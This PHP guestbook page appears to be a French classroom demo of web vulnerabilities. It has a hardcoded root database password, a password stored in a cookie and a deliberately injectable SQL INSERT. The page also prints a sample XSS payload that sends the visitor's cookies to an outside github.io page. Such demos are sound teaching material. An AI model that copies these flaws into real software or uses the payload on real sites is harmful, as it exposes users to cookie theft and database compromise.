<?php
setcookie('pwd', 'admin123');
$pdo = new PDO("mysql:host=localhost;dbname=securite", 'root', '6RHXPbxb');

if (isset($_POST['ajouterMot'])) {
    $mot = $_POST['mot'];
    $pdo->query("INSERT INTO comments (comment) VALUES ('$mot')");
}
?>

<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Livre d'or</title>
</head>
<body>
    <h1>Livre d'or</h1>
    <?php
    $selectall = $pdo->query("SELECT * FROM comments");
    $result = $selectall->fetchAll();
    foreach ($result as $ligne) {
        echo '<div>' . htmlspecialchars($ligne['comment']) . '</div>';
        echo '<small>Posté le ' . htmlspecialchars($ligne['created_at']) . '</small><br><br>';
    }

    ?>

    <h3>Ajouter un commentaire</h3>
    <form method="post" action="#">
        Mon mot : <textarea name="mot"></textarea><br>
        <input type="submit" value="Ajouter le commentaire" name="ajouterMot">
    </form>

    <p>Ce site stocke votre mot de passe dans un cookie</p>
    <h3>Exemple d'attaque XSS</h3>
    <input style="width:100%" value="<script>document.location=\'https:\\tvinchent-epsi.github.io/xss.html?cookie=\'+document.cookie</script>">
    <p>En ajoutant ce script comme entrée du livre d'or;</p>
    <ul>
        <li>vous créez une redirection vers un script malveillant</li>
    </ul>
</body>
</html>
